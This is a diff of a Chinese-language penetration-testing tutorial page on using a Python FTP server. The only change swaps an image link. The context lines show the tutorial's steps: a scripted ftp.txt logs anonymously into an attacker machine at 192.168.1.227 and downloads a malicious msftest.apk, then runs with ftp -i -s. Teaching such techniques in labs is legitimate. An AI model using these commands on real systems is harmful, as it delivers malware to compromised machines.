@@ -15,7 +15,7 @@ python快速开启ftp服务器
 <p>用控制台写入一个ftp.txt文件，使用匿名登录anonymous到攻击机的ftp服务，从攻击机上下载恶意文件msftest.apk</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">copy con ftp.txt </span><br><span class="line">open 192.168.1.227 2121 </span><br><span class="line">anonymous</span><br><span class="line">anonymous</span><br><span class="line">get msftest.apk</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\admin\Desktop\CTF\WEB\image-20230602195727154.png" alt="image-20230602195727154"></p>
+<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230602195727154.png" alt="image-20230602195727154"></p>
 <p>保存为ftp.txt文件：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp -i -s:ftp.txt</span><br></pre></td></tr></table></figure>
 
